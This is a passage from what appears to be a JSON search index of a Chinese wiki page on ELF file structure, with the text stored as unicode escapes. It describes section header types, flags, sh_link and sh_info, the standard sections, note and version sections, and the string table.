\u76f8\u5173\u5f15\u7528\u7684\u7edd\u5bf9\u503c\u3002\u4f8b\u5982\u4e0e\u8282\u53f7SHN_ABS\u76f8\u5173\u7684\u7b26\u53f7\u62e5\u6709\u7edd\u5bf9\u503c\uff0c\u5b83\u4eec\u4e0d\u53d7\u91cd\u5b9a\u4f4d\u7684\u5f71\u54cd SHN_COMMON 0xfff2 \u8fd9\u4e00\u8282\u533a\u76f8\u5b9a\u4e49\u7684\u7b26\u53f7\u662f\u901a\u7528\u7b26\u53f7\uff0c\u4f8b\u5982FORTRAN COMMON\uff0cC\u8bed\u8a00\u4e2d\u672a\u5206\u914d\u7684\u5916\u90e8\u53d8\u91cf\u3002 SHN_HIRESERVE 0xffff \u4fdd\u7559\u7d22\u5f15\u503c\u8303\u56f4\u7684\u4e0a\u754c\u3002 \u7cfb\u7edf\u4fdd\u7559\u5728 SHN_LORESERVE \u5230 SHN_HIRESERVE \u4e4b\u95f4(\u5305\u542b\u8fb9\u754c)\u7684\u7d22\u5f15\u503c\uff0c\u8fd9\u4e9b\u503c\u4e0d\u5728\u8282\u5934\u8868\u4e2d\u5f15\u7528\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u8282\u5934\u8868\u4e0d\u5305\u542b\u4fdd\u7559\u7d22\u5f15\u9879\u3002\u6ca1\u7279\u522b\u7406\u89e3\u3002","title":"\u7279\u6b8a\u4e0b\u6807"},{"location":"executable/elf/elf_structure/#_9","text":"","title":"\u90e8\u5206\u8282\u5934\u5b57\u6bb5"},{"location":"executable/elf/elf_structure/#sh_type","text":"\u8282\u7c7b\u578b\u76ee\u524d\u6709\u4e0b\u5217\u53ef\u9009\u8303\u56f4\uff0c\u5176\u4e2d SHT \u662f Section Header Table \u7684\u7b80\u5199\u3002 \u540d\u79f0 \u53d6\u503c \u8bf4\u660e SHT_NULL 0 \u8be5\u7c7b\u578b\u8282\u533a\u662f\u975e\u6d3b\u52a8\u7684\uff0c\u8fd9\u79cd\u7c7b\u578b\u7684\u8282\u5934\u4e2d\u7684\u5176\u5b83\u6210\u5458\u53d6\u503c\u65e0\u610f\u4e49\u3002 SHT_PROGBITS 1 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u5b9a\u4e49\u7684\u4fe1\u606f\uff0c\u5b83\u7684\u683c\u5f0f\u548c\u542b\u4e49\u90fd\u7531\u7a0b\u5e8f\u6765\u51b3\u5b9a\u3002 SHT_SYMTAB 2 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4e00\u4e2a\u7b26\u53f7\u8868\uff08 SYMbol TABle \uff09\u3002\u76ee\u524d\u76ee\u6807\u6587\u4ef6\u5bf9\u6bcf\u79cd\u7c7b\u578b\u7684\u8282\u533a\u90fd\u53ea \u80fd\u5305\u542b\u4e00\u4e2a\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u9650\u5236\u5c06\u6765\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002 \u4e00\u822c\uff0cSHT_SYMTAB \u8282\u533a\u63d0\u4f9b\u7528\u4e8e\u94fe\u63a5\u7f16\u8f91\uff08\u6307 ld \u800c\u8a00\uff09 \u7684\u7b26\u53f7\uff0c\u5c3d\u7ba1\u4e5f\u53ef\u7528\u6765\u5b9e\u73b0\u52a8\u6001\u94fe\u63a5\u3002 SHT_STRTAB 3 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u5b57\u7b26\u4e32\u8868\uff08 STRing TABle \uff09\u3002 SHT_RELA 4 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u663e\u5f0f\u6307\u5b9a\u4f4d\u6570\u7684\u91cd\u5b9a\u4f4d\u9879\uff08 RELocation entry with Addends \uff09\uff0c\u4f8b\u5982\uff0c32 \u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_Rela \u7c7b\u578b\u3002\u6b64\u5916\uff0c\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_HASH 5 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\uff08 HASH table \uff09\u3002 SHT_DYNAMIC 6 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7684\u4fe1\u606f\uff08 DYNAMIC linking \uff09\u3002 SHT_NOTE 7 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6807\u8bb0\u6587\u4ef6\u7684\u4fe1\u606f\uff08 NOTE \uff09\u3002 SHT_NOBITS 8 \u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5360\u7528\u6587\u4ef6\u7684\u7a7a\u95f4\uff0c\u5176\u5b83\u65b9\u9762\u548cSHT_PROGBITS\u76f8\u4f3c\u3002\u5c3d\u7ba1\u8be5\u7c7b\u578b\u8282\u533a\u4e0d\u5305\u542b\u4efb\u4f55\u5b57\u8282\uff0c\u5176\u5bf9\u5e94\u7684\u8282\u5934\u6210\u5458sh_offset \u4e2d\u8fd8\u662f\u4f1a\u5305\u542b\u6982\u5ff5\u6027\u7684\u6587\u4ef6\u504f\u79fb\u3002 SHT_REL 9 \u8be5\u7c7b\u578b\u8282\u533a\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u9879\uff08 RELocation entry without Addends \uff09\uff0c\u4e0d\u8fc7\u5e76\u6ca1\u6709\u6307\u5b9a\u4f4d\u6570\u3002\u4f8b\u5982\uff0c32\u4f4d\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 Elf32_rel \u7c7b\u578b\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002 SHT_SHLIB 10 \u8be5\u7c7b\u578b\u6b64\u8282\u533a\u88ab\u4fdd\u7559\uff0c\u4e0d\u8fc7\u5176\u8bed\u4e49\u5c1a\u672a\u88ab\u5b9a\u4e49\u3002 SHT_DYNSYM 11 \u4f5c\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u7b26\u53f7\u8868\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u5f88\u591a\u5bf9\u52a8\u6001\u94fe\u63a5\u800c\u8a00\u4e0d\u5fc5 \u8981\u7684\u7b26\u53f7\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4e5f\u53ef\u4ee5\u5305\u542b\u4e00\u4e2a SHT_DYNSYM \u8282\u533a\uff0c\u5176\u4e2d\u4fdd\u5b58\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u7684\u4e00\u4e2a\u6700\u5c0f\u96c6\u5408\uff0c\u4ee5\u8282\u7701\u7a7a\u95f4\u3002 SHT_LOPROC 0X70000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0b\u754c\uff08 LOw PROCessor-specific semantics \uff09\u3002 SHT_HIPROC OX7FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4e13\u7528\u8bed\u4e49\u7684\u4e0a\u754c\uff08 HIgh PROCessor-specific semantics \uff09\u3002 SHT_LOUSER 0X80000000 \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0b\u754c\u3002 SHT_HIUSER 0X8FFFFFFF \u6b64\u503c\u6307\u5b9a\u4fdd\u7559\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u7d22\u5f15\u4e0a\u754c\u3002","title":"sh_type"},{"location":"executable/elf/elf_structure/#sh_flags","text":"\u8282\u5934\u4e2d sh_flags \u5b57\u6bb5\u7684\u6bcf\u4e00\u4e2a\u6bd4\u7279\u4f4d\u90fd\u53ef\u4ee5\u7ed9\u51fa\u5176\u76f8\u5e94\u7684\u6807\u8bb0\u4fe1\u606f\uff0c\u5176\u5b9a\u4e49\u4e86\u5bf9\u5e94\u7684\u8282\u533a\u7684\u5185\u5bb9\u662f\u5426\u53ef\u4ee5\u88ab\u4fee\u6539\u3001\u88ab\u6267\u884c\u7b49\u4fe1\u606f\u3002\u5982\u679c\u4e00\u4e2a\u6807\u5fd7\u4f4d\u88ab\u8bbe\u7f6e\uff0c\u5219\u8be5\u4f4d\u53d6\u503c\u4e3a1\uff0c\u672a\u5b9a\u4e49\u7684\u4f4d\u90fd\u4e3a0\u3002\u76ee\u524d\u5df2\u5b9a\u4e49\u503c\u5982\u4e0b\uff0c\u5176\u4ed6\u503c\u4fdd\u7559\u3002 \u540d\u79f0 \u503c \u8bf4\u660e SHF_WRITE 0x1 \u8fd9\u79cd\u8282\u5305\u542b\u4e86\u8fdb\u7a0b\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u88ab\u5199\u7684\u6570\u636e\u3002 SHF_ALLOC 0x2 \u8fd9\u79cd\u8282\u5728\u8fdb\u7a0b\u8fd0\u884c\u65f6\u5360\u7528\u5185\u5b58\u3002\u5bf9\u4e8e\u4e0d\u5360\u7528\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5b58\u955c\u50cf\u7a7a\u95f4\u7684\u67d0\u4e9b\u63a7\u5236\u8282\uff0c\u8be5\u5c5e\u6027\u5904\u4e8e\u5173\u95ed\u72b6\u6001(off)\u3002 SHF_EXECINSTR 0x4 \u8fd9\u79cd\u8282\u5305\u542b\u53ef\u6267\u884c\u7684\u673a\u5668\u6307\u4ee4\uff08 EXECutable INSTRuction \uff09\u3002 SHF_MASKPROC 0xf0000000 \u6240\u6709\u5728\u8fd9\u4e2a\u63a9\u7801\u4e2d\u7684\u6bd4\u7279\u4f4d\u7528\u4e8e\u7279\u5b9a\u5904\u7406\u5668\u8bed\u4e49\u3002","title":"sh_flags"},{"location":"executable/elf/elf_structure/#sh_link-sh_info","text":"\u5f53\u8282\u533a\u7c7b\u578b\u7684\u4e0d\u540c\u7684\u65f6\u5019\uff0csh_link \u548c sh_info \u4e5f\u4f1a\u5177\u6709\u4e0d\u540c\u7684\u542b\u4e49\u3002 sh_type sh_link sh_info SHT_DYNAMIC \u8282\u533a\u4e2d\u4f7f\u7528\u7684\u5b57\u7b26\u4e32\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_HASH \u6b64\u54c8\u5e0c\u8868\u6240\u4f7f\u7528\u7684\u7b26\u53f7\u8868\u7684\u8282\u5934\u7d22\u5f15 0 SHT_REL/SHT_RELA \u4e0e\u7b26\u53f7\u8868\u76f8\u5173\u7684\u7684\u8282\u5934\u7d22\u5f15 \u91cd\u5b9a\u4f4d\u5e94\u7528\u5230\u7684\u8282\u7684\u8282\u5934\u7d22\u5f15 SHT_SYMTAB/SHT_DYNSYM \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f\uff0cLinux \u4e2d\u7684 ELF \u6587\u4ef6\u4e2d\u8be5\u9879\u6307\u5411\u7b26\u53f7\u8868\u4e2d\u7b26\u53f7\u6240\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u8282\u533a\u5728 Section Header Table \u4e2d\u7684\u504f\u79fb\u3002 \u64cd\u4f5c\u7cfb\u7edf\u7279\u5b9a\u4fe1\u606f other SHN_UNDEF 0","title":"sh_link &amp; sh_info"},{"location":"executable/elf/elf_structure/#sections","text":"\u8282\u533a\u5305\u542b\u76ee\u6807\u6587\u4ef6\u4e2d\u9664\u4e86 ELF \u5934\u90e8\u3001\u7a0b\u5e8f\u5934\u90e8\u8868\u3001\u8282\u533a\u5934\u90e8\u8868\u7684\u6240\u6709\u4fe1\u606f\u3002\u8282\u533a\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u6bcf\u4e2a\u8282\u533a\u90fd\u6709\u5bf9\u5e94\u7684\u8282\u5934\u6765\u63cf\u8ff0\u5b83\u3002\u4f46\u662f\u53cd\u8fc7\u6765\uff0c\u8282\u533a\u5934\u90e8\u5e76\u4e0d\u4e00\u5b9a\u4f1a\u5bf9\u5e94\u7740\u4e00\u4e2a\u8282\u533a\u3002 \u6bcf\u4e2a\u8282\u533a\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u662f\u8fde\u7eed\u7684\uff0c\u4f46\u662f\u5927\u5c0f\u53ef\u80fd\u4e3a 0\u3002 \u4efb\u610f\u4e24\u4e2a\u8282\u533a\u4e0d\u80fd\u91cd\u53e0\uff0c\u5373\u4e00\u4e2a\u5b57\u8282\u4e0d\u80fd\u540c\u65f6\u5b58\u5728\u4e8e\u4e24\u4e2a\u8282\u533a\u4e2d\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709\u95f2\u7f6e\u7a7a\u95f4\uff08inactive space\uff09\uff0c\u5404\u79cd\u5934\u548c\u8282\u4e0d\u4e00\u5b9a\u4f1a\u8986\u76d6\u5230\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5b57\u8282\uff0c \u95f2\u7f6e\u533a\u57df\u7684\u5185\u5bb9\u672a\u6307\u5b9a \u3002 \u8bb8\u591a\u5728 ELF \u6587\u4ef6\u4e2d\u7684\u8282\u90fd\u662f\u9884\u5b9a\u4e49\u7684\uff0c\u5b83\u4eec\u5305\u542b\u7a0b\u5e8f\u548c\u63a7\u5236\u4fe1\u606f\u3002\u8fd9\u4e9b\u8282\u88ab\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\uff0c\u4f46\u662f\u5bf9\u4e8e\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\uff0c\u540c\u4e00\u8282\u533a\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u7c7b\u578b\u4ee5\u53ca\u5c5e\u6027\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u662f\u7531\u94fe\u63a5\u5668\u5c06\u4e00\u4e9b\u5355\u72ec\u7684\u76ee\u6807\u6587\u4ef6\u4ee5\u53ca\u5e93\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u800c\u5f97\u5230\u7684\u3002\u5176\u4e2d\uff0c\u94fe\u63a5\u5668\u4f1a\u89e3\u6790\u5f15\u7528\uff08\u4e0d\u540c\u6587\u4ef6\u4e2d\u7684\u5b50\u4f8b\u7a0b\u7684\u5f15\u7528\u4ee5\u53ca\u6570\u636e\u7684\u5f15\u7528\uff0c\u8c03\u6574\u5bf9\u8c61\u6587\u4ef6\u4e2d\u7684\u7edd\u5bf9\u5f15\u7528\uff09\u5e76\u4e14\u91cd\u5b9a\u4f4d\u6307\u4ee4\u3002\u52a0\u8f7d\u4e0e\u94fe\u63a5\u8fc7\u7a0b\u9700\u8981\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4f1a\u5c06\u5904\u7406\u540e\u7684\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e9b\u7279\u5b9a\u7684\u8282\u533a\u4e2d\uff0c\u6bd4\u5982 .dynamic \u3002 \u6bcf\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u90fd\u4f1a\u652f\u6301\u4e00\u7ec4\u94fe\u63a5\u6a21\u578b\uff0c\u4f46\u8fd9\u4e9b\u6a21\u578b\u90fd\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u4e24\u79cd \u7c7b\u578b \u63cf\u8ff0 \u9759\u6001\u94fe\u63a5 \u9759\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u90fd\u88ab\u9759\u6001\u7ed1\u5b9a\u4e86\uff0c\u5176\u5f15\u7528\u5df2\u7ecf\u88ab\u89e3\u6790\u4e86\u3002 \u52a8\u6001\u94fe\u63a5 \u52a8\u6001\u94fe\u63a5\u7684\u6587\u4ef6\u4e2d\u6240\u4f7f\u7528\u7684\u5e93\u6587\u4ef6\u6216\u8005\u7b2c\u4e09\u65b9\u5e93\u53ea\u662f\u5355\u7eaf\u5730\u88ab\u94fe\u63a5\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002\u5f53\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u65f6\u4f7f\u7528\u5230\u76f8\u5e94\u51fd\u6570\u65f6\uff0c\u76f8\u5e94\u7684\u51fd\u6570\u5730\u5740\u624d\u4f1a\u88ab\u89e3\u6790\u3002 \u6709\u4e00\u4e9b\u7279\u6b8a\u7684\u8282\u53ef\u4ee5\u652f\u6301\u8c03\u8bd5\uff0c\u6bd4\u5982\u8bf4 .debug \u4ee5\u53ca .line \u8282\uff1b\u652f\u6301\u7a0b\u5e8f\u63a7\u5236\u7684\u8282\u6709 .bss\uff0c.data\uff0c .data1\uff0c .rodata\uff0c .rodata1\u3002 \u540d\u79f0 \u7c7b\u578b \u5c5e\u6027 \u542b\u4e49 .comment SHT_PROGBITS \u5305\u542b\u7248\u672c\u63a7\u5236\u4fe1\u606f\u3002 .debug SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u7b26\u53f7\u8c03\u8bd5\u7684\u4fe1\u606f\u3002 .dynamic SHT_DYNAMIC SHF_ALLOC SHF_WRITE \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u4fe1\u606f\u3002SHF_WRITE \u4f4d\u8bbe\u7f6e\u4e0e\u5426\u662f\u5426\u88ab\u8bbe\u7f6e\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5904\u7406\u5668\u3002 .dynstr SHT_STRTAB SHF_ALLOC \u6b64\u8282\u533a\u5305\u542b\u7528\u4e8e\u52a8\u6001\u94fe\u63a5\u7684\u5b57\u7b26\u4e32\uff0c\u5927\u591a\u6570 \u60c5\u51b5\u4e0b\u8fd9\u4e9b\u5b57\u7b26\u4e32\u4ee3\u8868\u4e86\u4e0e\u7b26\u53f7\u8868\u9879\u76f8\u5173\u7684\u540d\u79f0\u3002 .dynsym SHT_DYNSYM SHF_ALLOC \u6b64\u8282\u533a\u5305\u542b\u52a8\u6001\u94fe\u63a5\u7b26\u53f7\u8868\u3002 .got SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u5168\u5c40\u504f\u79fb\u8868\u3002 .line SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u7b26\u53f7\u8c03\u8bd5\u7684\u884c\u53f7\u4fe1\u606f\uff0c\u63cf\u8ff0\u4e86\u6e90\u7a0b\u5e8f\u4e0e\u673a\u5668\u6307\u4ee4\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u5176\u5185\u5bb9\u662f\u672a\u5b9a\u4e49\u7684\u3002 .plt SHT_PROGBITS \u6b64\u8282\u533a\u5305\u542b\u8fc7\u7a0b\u94fe\u63a5\u8868\uff08procedure linkage table\uff09\u3002 .relname SHT_REL \u8fd9\u4e9b\u8282\u533a\u4e2d\u5305\u542b\u91cd\u5b9a\u4f4d\u4fe1\u606f\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u5305\u542b\u53ef\u52a0\u8f7d\u7684\u6bb5\uff0c\u6bb5\u4e2d\u6709\u91cd\u5b9a\u4f4d\u5185\u5bb9\uff0c\u8282\u533a\u7684\u5c5e\u6027\u5c06\u5305\u542bSHF_ALLOC\u4f4d\uff0c\u5426\u5219\u8be5\u4f4d\u7f6e 0\u3002\u4f20\u7edf\u4e0a name \u6839\u636e\u91cd\u5b9a\u4f4d\u6240\u9002\u7528\u7684\u8282\u533a\u7ed9\u5b9a\u3002\u4f8b\u5982 .text \u8282\u533a\u7684\u91cd\u5b9a\u4f4d\u8282\u533a\u540d\u5b57\u5c06\u662f\uff1a.rel.text \u6216\u8005 .rela.text\u3002 .relaname SHT_RELA .shstrtab SHT_STRTAB \u6b64\u8282\u533a\u5305\u542b\u8282\u533a\u540d\u79f0\u3002 \u6ce8\u610f\uff1a \u4ee5 \u201c.\u201d \u5f00\u5934\u7684\u8282\u533a\u540d\u79f0\u662f\u7cfb\u7edf\u4fdd\u7559\u7684\uff0c\u5f53\u7136\u5e94\u7528\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e9b\u8282\u533a\u3002\u4e3a\u4e86\u907f\u514d\u4e0e\u7cfb\u7edf\u8282\u533a\u51b2\u7a81\uff0c\u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u5c3d\u91cf\u4f7f\u7528\u6ca1\u6709\u524d\u7f00\u7684\u8282\u533a\u540d\u79f0\u3002 \u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u5141\u8bb8\u5b9a\u4e49\u4e0d\u5728\u4e0a\u8ff0\u5217\u8868\u4e2d\u7684\u8282\u533a\uff0c\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u540d\u5b57\u76f8\u540c\u7684\u8282\u533a\u3002 \u4fdd\u7559\u7ed9\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u8282\u533a\u540d\u79f0\u4e00\u822c\u547d\u540d\u89c4\u5219\u4e3a\uff1a\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u540d\u79f0\u7b80\u5199+ \u8282\u533a\u540d\u79f0\u3002\u5176\u4e2d\uff0c\u5904\u7406\u5668\u540d\u79f0\u5e94\u8be5\u4e0e e_machine \u4e2d\u4f7f\u7528\u7684\u540d\u79f0\u76f8\u540c\u3002\u4f8b\u5982 .FOO.psect \u8282\u533a\u662f FOO \u4f53\u7cfb\u7ed3\u6784\u4e2d\u7684 psect \u8282\u533a\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684\u5206\u7c7b\u5373\u6bb5\u7c7b\u578b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u540c\u65f6\u4e5f\u4f1a\u52a0\u4e0a\u81ea\u5df1\u7684\u4e00\u4e9b\u7b80\u5355\u5206\u7c7b\u3002","title":"Sections"},{"location":"executable/elf/elf_structure/#note-related-sections","text":"\u6709\u65f6\u5019\u751f\u4ea7\u5382\u5546\u6216\u8005\u7cfb\u7edf\u6784\u5efa\u8005\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u4e00\u4e9b\u7279\u6b8a\u7684\u4fe1\u606f\u6765\u6807\u8bb0ELF\u6587\u4ef6\uff0c\u4ece\u800c\u5176\u5b83\u7a0b\u5e8f\u53ef\u4ee5\u6765\u68c0\u67e5\u8be5ELF\u6587\u4ef6\u7684\u4e00\u81f4\u6027\u4ee5\u53ca\u517c\u5bb9\u6027\u3002\u8282\u533a\u7c7b\u578b\u4e3a SHT_NOTE \u6216\u8005\u7a0b\u5e8f\u5934\u90e8\u7c7b\u578b\u4e3a PT_NOTE \u7684\u5143\u7d20\u7528\u4e8e\u6765\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\uff0c\u5b83\u4eec\u4e2d\u5bf9\u8c61\u7684\u8868\u9879\u53ef\u80fd\u5305\u542b\u4e00\u5230\u591a\u4e2a\uff0c\u6bcf\u4e00\u4e2a\u8868\u9879\u90fd\u662f\u76ee\u6807\u5904\u7406\u5668\u683c\u5f0f\u7684 4 \u5b57\u8282\u6570\u7ec4\u3002\u4e0b\u9762\u7ed9\u51fa\u4e86\u4e00\u4e9b\u53ef\u80fd\u7684\u6ce8\u91ca\u4fe1\u606f\u3002\u4f46\u662f\u8fd9\u5e76\u4e0d\u5728 ELF \u6587\u4ef6\u7684\u89c4\u8303\u5185\u3002 namesz\u4e0ename name\u7684\u524dnamesz\u5b57\u8282\u5305\u542b\u4e86\u4e00\u4e2a\u4ee5NULL\u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u8868\u793a\u8be5\u9879\u7684\u62e5\u6709\u8005\u6216\u8005\u53d1\u8d77\u4eba\u3002\u4f46\u662f\u76ee\u524d\u5e76\u6ca1\u6709\u907f\u514d\u51b2\u7a81\u7684\u683c\u5f0f\u5316\u7684\u547d\u540d\u673a\u5236\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u751f\u4ea7\u5382\u5546\u4f1a\u4f7f\u7528\u4ed6\u4eec\u81ea\u5df1\u516c\u53f8\u7684\u540d\u5b57\uff0c\u4f8b\u5982\u201cXYZ Computer Company\u201d\u6765\u5f53\u505a\u5bf9\u5e94\u7684\u6807\u5fd7\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u540d\u5b57\u7684\u8bdd\uff0cnamesz\u5e94\u8be5\u662f0\u3002\u90a3\u4e48\u5728name\u7684\u5730\u65b9\u5e94\u8be5\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002 descsz\u4e0edesc desc\u7684\u524ddescsz\u5b57\u8282\u5305\u542b\u4e86\u6ce8\u91ca\u7684\u63cf\u8ff0\u3002ELF\u6587\u4ef6\u5bf9\u4e8e\u63cf\u8ff0\u7684\u5185\u5bb9\u6ca1\u6709\u4efb\u4f55\u7ea6\u675f\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u63cf\u8ff0\u7684\u8bdd\uff0cdescsz\u5e94\u8be5\u4e3a0\u3002\u5f53\u7136\uff0c\u5e94\u8be5\u5728desc\u5904\u586b\u5145\u52304\u5b57\u8282\u5bf9\u9f50\u3002 type \u8fd9\u4e2a\u5b57\u6bb5\u7ed9\u51fa\u4e86\u63cf\u8ff0\u7684\u89e3\u91ca\uff0c\u5bf9\u4e8e\u4e0d\u540c\u90a3\u4e2a\u7684\u53d1\u8d77\u8005\u6765\u8bf4\uff0c\u4ed6\u4eec\u90fd\u5fc5\u987b\u63a7\u5236\u81ea\u5df1\u7684\u7c7b\u578b\uff0c\u5bf9\u4e8e\u540c\u4e00\u7c7b\u578b\u6765\u8bf4\uff0c\u6709\u53ef\u80fd\u6709\u591a\u4e2a\u63cf\u8ff0\u4e0e\u5176\u5bf9\u5e94\u3002\u56e0\u6b64\uff0c\u53d1\u8d77\u8005\u5fc5\u987b\u80fd\u591f\u8bc6\u522b\u540d\u5b57\u4ee5\u53ca\u7c7b\u578b\u4ee5\u4fbf\u4e8e\u6765\u7406\u89e3\u5bf9\u5e94\u7684\u63cf\u8ff0\u3002\u76ee\u524d\u6765\u8bf4\uff0c\u7c7b\u578b\u4e0d\u80fd\u591f\u4e3a\u975e\u8d1f\u503c\uff0cELF\u6587\u4ef6\u7684\u89c4\u8303\u91cc\u5e76\u4e0d\u5b9a\u4e49\u63cf\u8ff0\u7b26\u7684\u610f\u601d\u3002\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48type\u5728\u524d\u9762\u3002 \u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\u4e00\u4e0b \u8fd9\u91cc\u5305\u542b\u4e86\u4e24\u4e2a\u8868\u9879\u3002 \u5728 Linux \u4e2d\uff0c\u4e0e Note \u76f8\u5173\u7684\u8282\u5305\u542b\u4e86 ELF \u6587\u4ef6\u4e2d\u7684\u4e00\u4e9b\u6ce8\u91ca\u4fe1\u606f\uff0c\u4e3b\u8981\u5305\u542b\u4e24\u4e2a\u8282 .note.ABI-tag .note.gnu.build-id","title":"Note related sections"},{"location":"executable/elf/elf_structure/#_10","text":"","title":"\u4f8b\u5b50"},{"location":"executable/elf/elf_structure/#version-releated-sections","text":"ELF \u6587\u4ef6\u4e0d\u4ec5\u53ef\u4ee5\u5bfc\u5165\u5916\u90e8\u7684\u7b26\u53f7\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u5bfc\u5165\u6307\u5b9a\u7248\u672c\u7684\u7b26\u53f7\u3002\u4f8b\u5982\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u4ece GLIBC_2.2.5 \u4e2d\u5bfc\u5165\u5176\u4e2d\u7684\u4e00\u4e9b\u6807\u51c6\u5e93\u51fd\u6570\uff0c\u6bd4\u5982 printf\u3002\u5176\u4e2d\uff0c.gnu.version_r \u4fdd\u5b58\u4e86\u7248\u672c\u7684\u5b9a\u4e49\uff0c\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u662f Elf_Verdef\u3002 \u5982\u4e0b .gnu.version\uff0cVersions of symbols. .gnu.version_d\uff0cVersion definitions of symbols. .gnu.version_r\uff0cVersion references (version needs) of symbols.","title":"version releated sections"},{"location":"executable/elf/elf_structure/#_11","text":"","title":"\u4f8b\u5b50"},{"location":"executable/elf/elf_structure/#strtab-string-table","text":"\u8be5\u8282\u533a\u63cf\u8ff0\u9ed8\u8ba4\u7684\u5b57\u7b26\u4e32\u8868\uff0c\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u7684\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u3002ELF \u6587\u4ef6\u4f7f\u7528\u8fd9\u4e9b\u5b57\u7b26\u4e32\u6765\u5b58\u50a8\u7a0b\u5e8f\u4e2d\u7684\u7b26\u53f7\u540d\uff0c\u5305\u62ec \u53d8\u91cf\u540d \u51fd\u6570\u540d \u8be5\u8282\u5728\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\u4e0d\u9700\u8981\u52a0\u8f7d\uff0c\u53ea\u9700\u8981\u52a0\u8f7d\u5bf9\u5e94\u7684\u5b50\u96c6 .dynstr \u8282\u3002 